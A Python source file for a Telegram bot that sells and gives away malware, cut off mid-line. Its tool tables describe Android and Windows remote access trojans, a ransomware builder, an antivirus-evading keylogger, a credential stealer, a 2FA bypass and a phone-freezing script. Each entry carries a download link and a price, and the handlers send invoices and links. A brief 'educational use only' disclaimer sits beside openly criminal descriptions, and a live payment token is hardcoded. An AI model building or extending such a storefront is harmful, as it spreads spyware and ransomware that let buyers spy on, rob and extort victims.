import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, LabeledPrice
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, PreCheckoutQueryHandler
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Configuration ---
BOT_TOKEN = ""
ADMIN_TELEGRAM_ID = 

# --- Tools Data ---
# Premium ----------
PREMIUM_TOOLS = {
    "ARoid": {
        "name": "ARoid Builder",
        "description": "A sophisticated tool designed for crafting custom Android remote access trojans, It provides users with a framework to build malicious applications capable of gaining unauthorized control over Android devices\n\nأداة متطورة مصممة لإنشاء أحصنة طروادة مخصصة للوصول عن بعد إلى أجهزة أندرويد، وهي توفر للمستخدمين إطار عمل لبناء تطبيقات ضارة قادرة على الحصول على سيطرة غير مصرح بها على أجهزة أندرويد\n\n",
        "price": "$2 USD",
        "stars_price": 100,
        "download_link": "https://www.mediafire.com/file/tgmv7of1mm58t9o/ARoidozgsjskahk-Cybaron_AC.zip/file"
    },
    "E Checker": {
        "name": "Email Checker",
        "description": "A tool for searching for people's information and their Email accounts using an interactive and easy to use user interface on Windows\n\nأداة للبحث عن معلومات الأشخاص وحسابات البريد الإلكتروني الخاصة بهم باستخدام واجهة مستخدم تفاعلية وسهلة الاستخدام على نظام التشغيل ويندوز\n\n",
        "price": "$1 USD",
        "stars_price": 50,
        "download_link": "https://www.mediafire.com/file/cmj2fvfhqneeiht/E-Checkerhzkaho1hz-Cybaron_AC.zip/file"
    },
    "EagleSpy": {
        "name": "EagleSpy",
        "description": "A sophisticated remote access trojan designed to coverty monitor and control Android devices, It provides an attacker with extensive capabilities to spy on a target\n\nحصان طروادة متطور للوصول عن بعد مصمم لمراقبة أجهزة أندرويد والتحكم فيها بشكل سري، ويوفر للمهاجم قدرات واسعة للتجسس على الهدف\n\n",
        "price": "$2 USD",
        "stars_price": 100,
        "download_link": "https://www.mediafire.com/file/k0t6amqpvm3ppao/EagleSpyiaozjhdkvd-Cybaron_AC.zip/file"
    },
    "G700": {
        "name": "G700",
        "description": "A remote access trojan primarilly known for its extensive capabilties in surveillance, data exfiltration, and remote control over compromised systems It allows attackers to covertly monitor user activity\n\nإن حصان طروادة الوصول عن بعد معروف بقدراته الواسعة في المراقبة وتسلل البيانات والتحكم عن بعد على الأنظمة المخترقة، يسمح للمهاجمين بمراقبة نشاط المستخدم سرا\n\n",
        "price": "$2 USD",
        "stars_price": 100,
        "download_link": "https://www.mediafire.com/file/p3em2j73ns6oaq5/G700vsjskzoj1gz-Cybaron_AC.zip/file"
    },
    "Keylogger": {
        "name": "Keylogger",
        "description": "A keylogger that logs keystrokes without the user's knowledge, runs in the background, and is undetectable by standard antivirus software, It can send the logged data, including passwords, to the speaker at high speed\n\nبرنامج تسجيل نقرات لوحة المفاتيح دون علم المستخدم، تعمل في الخلفية، وغير قابلة للاكتشاف بواسطة برامج مكافحة الفيروسات القياسية، يمكنها إرسال البيانات المسجلة بما فيها كلمات المرور إلى المتحدم بسرعة كبيرة\n\n",
        "price": "$1 USD",
        "stars_price": 50,
        "download_link": "https://www.mediafire.com/file/buscn1b4cegrl6f/KeyLoggerpaksjizhbsh-Cybaron_AC.zip/file"
    },
    "Pegasus": {
        "name": "Pegasus Spyware",
        "description": "A highly sophisticated and invasive spyware developed by the Israeli cyber arms company NSO Group, It's designed to be covertly installed on mobile phones and other devices running most versions of iOS and Android, Once installed, Pegasus can monitor all activities on the device, including reading text messages, listening to calls, collecting passwords, tracking locations, accessing the target device's microphone and camera, and harvesting information from apps, It's known for its 'Zero Click' exploit capabilities, meaning it can infect a device without any interaction from the target\n\nبرنامج تجسس شديد التطور والتطفل، تم تطويره بواسطة شركة NSO Group الإسرائيلية للأسلحة السيبرانية، تم تصميمه ليتم تثبيته سراً على الهواتف المحمولة والأجهزة الأخرى التي تعمل بمعظم إصدارات iOS وأندرويد، بمجرد تثبيته، يمكن لبيغاسوس مراقبة جميع الأنشطة على الجهاز، بما في ذلك قراءة الرسائل النصية، والاستماع إلى المكالمات، وجمع كلمات المرور، وتتبع المواقع، والوصول إلى ميكروفون وكاميرا الجهاز المستهدف، وجمع المعلومات من التطبيقات، يشتهر بقدراته على الاستغلال 'بدون نقرة'، مما يعني أنه يمكنه إصابة الجهاز دون أي تفاعل من الهدف\n\n",
        "price": "$10 USD",
        "stars_price": 500,
        "download_link": "https://www.mediafire.com/file/drl0n8dxszz9vgm/Pegasushslahzozhlsv-Cybaron_AC.zip/file"
    },
    "Pekka": {
        "name": "Pekka",
        "description": "A Remote Access Trojan, designed to provide unauthorized remote control over an infected computer system, it is a Windows based threat often used for covert operations and data exfiltration\n\nحصان طروادة للوصول عن بعد، مصمم لتوفير تحكم عن بعد غير مصرح به على نظام كمبيوتر مصاب، وهو تهديد يستهدف أنظمة Windows ويُستخدم غالبًا للقيام بعمليات سرية وسرقة البيانات\n\n",
        "price": "$2 USD",
        "stars_price": 100,
        "download_link": "https://www.mediafire.com/file/76lg6ds034ncg07/Pekkavsksjzhkahh-Cybaton_AC.zip/file"
    },
    "Ransomware": {
        "name": "Ransomware Builder",
        "description": "A tool that allows individuals, even with limited technical experience, to create ransomware, This tool comes with an easy to use interface and a range of customizable options, such as the encryption algorithm, the content of the ransom note, the cryptocurrency wallet address for payment, and the deadline for payment before the data is permanently deleted\n\nأداة تسمح للأفراد حتى ذوي الخبرة التقنية المحدودة، بإنشاء برامج الفدية، تأتي هذه الأداة مع واجهة سهلة الاستخدام ومجموعة من الخيارات القابلة للتخصيص، مثل خوارزمية التشفير، ومحتوى مذكرة الفدية، وعنوان محفظة العملة المشفرة للدفع، والموعد النهائي للدفع قبل حذف البيانات بشكل دائم\n\n",
        "price": "$1 USD",
        "stars_price": 50,
        "download_link": "https://www.mediafire.com/file/r1ekmt362d43yh0/Ransomwarepaizhsijsh-Cybaron_AC.zip/file"
    },
    "Roblox": {
        "name": "Roblox Hacking",
        "description": "A software tool to bypass and hack security measures such as Personal Identification Numbers PINs and Two Factor Authentication 2FA on Roblox accounts without the victim's interaction\n\nأداة برمجية لتجاوز واختراق الإجراءات الأمنية مثل أرقام التعريف الشخصية والمصادقة الثنائية على حسابات Roblox دون تفاعل الضحية\n\n",
        "price": "$5 USD",
        "stars_price": 250,
        "download_link": "https://www.mediafire.com/file/h9wcw5j040vmjo2/Robloxbskajhskgzkvscv-Cybaron_AC.zip/file"
    },
    "Spider": {
        "name": "Spider Script",
        "description": "A script to freeze iPhone and Android phones and stop them from working for an unlimited time by phone number through WhatsApp, The user cannot use the phone until it is turned off\n\nسكربت لتجميد هواتف الايفون والاندرويد وايقافها عن العمل لمدة غير محدودة عن طريق رقم الهاتف من خلال الواتس اب ولا يستطيع المستخدم استخدام الهاتف الا بعد اغلاقه\n\n",
        "price": "$2 USD",
        "stars_price": 100,
        "download_link": "https://www.mediafire.com/file/x12qwdqchud61rr/Spiderbkoahqjqohsj-Cybaron_AC.zip/file"
    },
    "SpyNote": {
        "name": "SpyNote",
        "description": "A remote access Trojan malware that primarily targets Android devices, it is considered one of the most widespread malware families targeting Android users\n\nبرنامج ضار من نوع حصان طروادة للوصول عن بعد يستهدف أجهزة أندرويد بشكل أساسي، ويعتبر أحد أكثر عائلات البرامج الضارة انتشارًا التي تستهدف مستخدمي أندرويد\n\n",
        "price": "$2 USD",
        "stars_price": 100,
        "download_link": "https://www.mediafire.com/file/r68es8bg0iif7b1/SpyNotenvxxgkifaz-Cybaron_AC.zip/file"
    },
    "Spyroid": {
        "name": "SpyDroid RAT",
        "description": "An Android application that allows users to monitor various activities on a target device, It can track call logs, SMS messages, location data, installed applications, and more, often operating discreetly in the background, It is primarily marketed for parental control or employee monitoring\n\nسبايدرويد هو تطبيق أندرويد يسمح للمستخدمين بمراقبة الأنشطة المختلفة على جهاز مستهدف، يمكنه تتبع سجلات المكالمات، ورسائل SMS، وبيانات الموقع، والتطبيقات المثبتة، والمزيد، وغالبًا ما يعمل بشكل سري في الخلفية، يتم تسويقه بشكل أساسي لأغراض الرقابة الأبوية أو مراقبة الموظفين\n\n",
        "price": "$2 USD",
        "stars_price": 100,
        "download_link": "https://www.mediafire.com/file/bvm6ilofz6w59k4/Spyroidbsksjoayzodhkz-Cybaron_AC.zip/file"
    },
    "XWorm": {
        "name": "XWorm RAT",
        "description": "A dangerous type of malware, primarily functioning as a Remote Access Trojan, It allows cybercriminals to gain unauthorized control over a victim's computer from a distance, XWorm is known for its wide range of capabilities, including stealing sensitive data like passwords and cryptocurrency information, logging keystrokes, and even deploying additional malicious payloads like ransomware\n\nنوع خطير من البرامج الضارة، يعمل بشكل أساسي كـ حصان طروادة للوصول عن بعد، يتيح للمجرمين السيبرانيين السيطرة غير المصرح بها على جهاز الكمبيوتر الخاص بالضحية عن بعد، يشتهر XWorm بمجموعة واسعة من الإمكانيات، بما في ذلك سرقة البيانات الحساسة مثل كلمات المرور ومعلومات العملات المشفرة، وتسجيل ضغطات المفاتيح keystrokes، وحتى نشر حمولات خبيثة إضافية مثل برامج الفدية ransomware\n\n",
        "price": "$2 USD",
        "stars_price": 100,
        "download_link": "https://www.mediafire.com/file/nbzuu9b20g42f1m/XWormbskoauajaohsv-Cybaron_AC.zip/file"
    },
    "ZeroTrace": {
        "name": "ZeroTrace Stealer",
        "description": "A malware designed to gather sensitive information from systems, It boasts capabilities such as harvesting credentials, financial data, and personal files, often employing sophisticated evasion techniques to avoid detection by security software\n\nبرنامج ضار مصمم لجمع معلومات حساسة من الأنظمة، ويتميز بقدرات مثل حصاد بيانات الاعتماد والبيانات المالية والملفات الشخصية، وغالبًا ما يستخدم تقنيات التهرب المتطورة لتجنب اكتشافه بواسطة برامج الأمان\n\n",
        "price": "$2 USD",
        "stars_price": 100,
        "download_link": "https://www.mediafire.com/file/6sfpiv4o96gve0h/ZeroTracedajakhzjgzkhzh-Cybaron_AC.zip/file"
    },
}

# Free ------------
FREE_TOOLS = {
    "CraxsRAT": {
        "name": "CraxsRAT",
        "description": "A powerful remote administration tool that offers extensive capabilities for controlling and monitoring Android devices, It allows users to gain unauthorized access to a target device\n\nأداة إدارة عن بعد قوية توفر إمكانيات واسعة للتحكم في أجهزة أندرويد ومراقبتها، فهي تسمح للمستخدمين بالوصول غير المصرح به إلى جهاز مستهدف\n\n",
        "download_link": "https://www.mediafire.com/file/azt6heoynnm2k3b/CraxsRAThzpaigzizgvs-Cybaron_AC.zip/file",
    },
    "CypherRAT": {
        "name": "CypherRAT",
        "description": "A stealthy remote access trojan specificallty designed to compromise and control Android devices with a focus on data exfilration and covert surveillence\n\nحصان طروادة خفي للوصول عن بعد مصمم خصيصًا لاختراق أجهزة أندرويد والتحكم فيها مع التركيز على استخراج البيانات والمراقبة السرية\n\n",
        "download_link": "https://www.mediafire.com/file/o02wfdu7zi0nfer/CypherRATkzozjhdkbdkvz-Cybaron_AC.zip/file",
    },
    "SilverRAT": {
        "name": "SilverRAT",
        "description": "A potent remote access trojan specifcally designed to gain comprehensive control over Android devices, enabling attackers to perform extensive surveillence and data exfiltration\n\nحصان طروادة قوي للوصول عن بعد مصمم خصيصًا للحصول على سيطرة شاملة على أجهزة أندرويد، مما يتيح للمهاجمين إجراء مراقبة مكثفة واستخراج البيانات\n\n",
        "download_link": "https://www.mediafire.com/file/conl1tir8nxamv1/SilverRATvskskzohagzogs-Cybaron_AC.zip/file",
    },
    "WiFisploit": {
        "name": "WiFisploit",
        "description": "A tool designed to scan and attack WiFi networks using variety of powerful and effective attacks, It contains numerous commands and modules designed to work against all types of networks\n\nأداة مصممة لفحص ومهاجمة شبكات WiFi باستخدام مجموعة متنوعة من الهجمات القوية والفعالة، وتحتوي على العديد من الأوامر والوحدات المصممة للعمل ضد جميع أنواع الشبكات\n\n",
        "download_link": "https://github.com/cybro-ac/WiFisploit.git",
    }
}

def generate_tool_keyboard(tools_dict, callback_prefix, items_per_row=3):
    keyboard = []
    current_row = []
    tool_items = list(tools_dict.items())
    
    for i, (tool_id, tool_info) in enumerate(tool_items):
        current_row.append(InlineKeyboardButton(tool_id, callback_data=f"{callback_prefix}{tool_id}"))
        if (i + 1) % items_per_row == 0:
            keyboard.append(current_row)
            current_row = []
    
    if current_row:
        keyboard.append(current_row)
        
    keyboard.append([InlineKeyboardButton("« Back To Main Menu", callback_data="back_to_start_menu")])
    return InlineKeyboardMarkup(keyboard)

# --- Handlers ---

async def start(update: Update, context) -> None:
    welcome_message = (
        "🟢 🔴 *C • Welcome*\n\n"
        "We're excited to have you join us, This bot is specially designed to provide you with the latest and most powerful tools to help you enhance your skills\n\nThese tools are intended for ethical and educational use only, We assume no responsibility for any illegal or unauthorized use of these tools, Please ensure you have the necessary legal permission before using any tool on any system"
    )
    keyboard = [
        [
            InlineKeyboardButton("Free Tools", callback_data="show_free_tools"),
            InlineKeyboardButton("Premium Tools", callback_data="show_premium_tools")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.message:
        await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
    elif update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(welcome_message, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)


async def show_free_tools(update: Update, context) -> None:
    query = update.callback_query
    await query.answer()
    
    message_text = "🟢 *C • Free Tools*\n\nSelect a tool to get more information and the download link\n\nاختر أداة للحصول على مزيد من المعلومات ورابط التنزيل"
    reply_markup = generate_tool_keyboard(FREE_TOOLS, callback_prefix="show_free_tool_")
    await query.edit_message_text(text=message_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)

async def show_premium_tools(update: Update, context) -> None:
    query = update.callback_query
    await query.answer()

    message_text = (
        "🟢 *C • Premium Tools*\n\n"
        "This bot offers the latest and most powerful tools at incredibly discounted prices\n\n"
        "يقدم هذا البوت أحدث وأقوى الأدوات بأسعار مخفضة بشكل لا يصدق"
    )
    reply_markup = generate_tool_keyboard(PREMIUM_TOOLS, callback_prefix="show_premium_tool_")
    await query.edit_message_text(text=message_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)


async def show_free_tool_details(update: Update, context) -> None:
    query = update.callback_query
    await query.answer()
    
    tool_id = query.data.replace("show_free_tool_", "")
    tool_info = FREE_TOOLS.get(tool_id)

    if tool_info:
        details_message = (
            f"🟢 *{tool_info['name']}*\n\n"
            f"{tool_info['description']}\n"
        )
        keyboard = [
            [InlineKeyboardButton("Get Tool", callback_data=f"get_free_tool_{tool_id}")],
            [InlineKeyboardButton("« Back To Free Tools", callback_data="show_free_tools")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(details_message, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await query.edit_message_text("Error: Tool not found.", parse_mode=ParseMode.MARKDOWN_V2)

async def get_free_tool(update: Update, context) -> None:
    query = update.callback_query
    await query.answer()
    
    tool_id = query.data.replace("get_free_tool_", "")
    tool_info = FREE_TOOLS.get(tool_id)

    if tool_info:
        download_message = (
            f"🟢 *C • Download link for {escape_markdown(tool_info['name'], version=2)}*\n\n"
            f"🔗 {escape_markdown(tool_info['download_link'], version=2)}\n\n"
            f"Enjoy your new tool\n\n"
        )
        keyboard = [
            [InlineKeyboardButton("« Back To Main Menu", callback_data="back_to_start_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(download_message, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await query.edit_message_text("Error: Could not retrieve download link.", parse_mode=ParseMode.MARKDOWN_V2)

async def show_premium_tool_details(update: Update, context) -> None:
    query = update.callback_query
    await query.answer()

    tool_id = query.data.replace("show_premium_tool_", "")
    tool_info = PREMIUM_TOOLS.get(tool_id)

    if tool_info:
        details_message = (
            f"🟢 *C • {tool_info['name']}*\n\n"
            f"{tool_info['description']}\n"
            f"Price: *{tool_info['price']}*\n"
            f"Stars Price: *{tool_info['stars_price']} Stars*\n"
        )

        keyboard = [
            [
                InlineKeyboardButton(f"Buy ({tool_info['stars_price']} Stars)", callback_data=f"request_tool_stars_{tool_id}")
            ],
            [InlineKeyboardButton("« Back To Premium Tools", callback_data="show_premium_tools")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(details_message, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await query.edit_message_text("Error: Tool not found.", parse_mode=ParseMode.MARKDOWN_V2)

async def request_tool_stars(update: Update, context) -> None:
    query = update.callback_query
    await query.answer()

    tool_id = query.data.replace("request_tool_stars_", "")
    tool_info = PREMIUM_TOOLS.get(tool_id)
    user = query.from_user

    if tool_info and tool_info['stars_price'] > 0:
        price_in_stars = tool_info['stars_price']
        title = f"Purchase {tool_info['name']}"
        description = f"Pay {price_in_stars} Stars for {tool_info['name']}"
        payload = f"stars_payment_{tool_id}_{user.id}"

        try:
            await context.bot.send_invoice(
                chat_id=user.id,
                title=title,
                description=description,
                payload=payload,
                provider_token="5775769170:LIVE:TG_Utb4pqteiv8EDLUh6S5qdXoA",
                currency="XTR",
                prices=[LabeledPrice(label=f"{tool_info['name']} ({price_in_stars} Stars)", amount=price_in_stars)]
            )
            
            await query.edit_message_text(
                "🟢 C • Payment Initiated\n\nAn invoice for Stars payment has been sent to you, Please complete the payment.\n\nتم إرسال فاتورة الدفع بالنجوم إليك، يرجى إتمام عملية الدفع",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back To Main Menu", callback_data="back_to_start_menu")]])
            )

        except Exception as e:
            logge
